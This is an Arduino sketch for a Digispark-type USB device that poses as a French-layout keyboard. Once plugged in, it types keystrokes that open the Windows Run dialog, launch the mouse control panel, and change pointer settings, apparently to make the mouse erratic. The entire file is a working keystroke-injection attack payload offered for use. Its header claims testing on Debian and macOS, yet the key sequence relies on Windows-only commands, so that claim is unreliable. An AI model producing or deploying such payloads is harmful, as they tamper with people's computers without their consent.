// Make mouse jiggle all around and decrease speed
// Tested on Windows 10/11, Debian-based machines, and macOS.
// Created by: Pentestersploit/Adrilaw https://github.com/Adrilaw

#include "DigiKeyboardFr.h" // Include the French DigiKeyboard library

void setup() {
  #define KEY_TAB 0x2B  // Define key codes for French keyboard
  #define KEY_ARROW_RIGHT 0x7E
  #define KEY_ARROW_LEFT 0x7D
  #define KEY_R 0x15
  #define KEY_ENTER 0x1C
  #define KEY_SPACE 0x39
}

void loop() {
  DigiKeyboardFr.sendKeyStroke(0);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.print("main.cpl");
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_SPACE);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_TAB);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_RIGHT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_RIGHT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_TAB);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_TAB);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_TAB);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_TAB);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_SPACE);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_RIGHT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_TAB);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_SPACE);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_TAB);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.print("100");
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  
  for(;;){ /* empty */ }
}

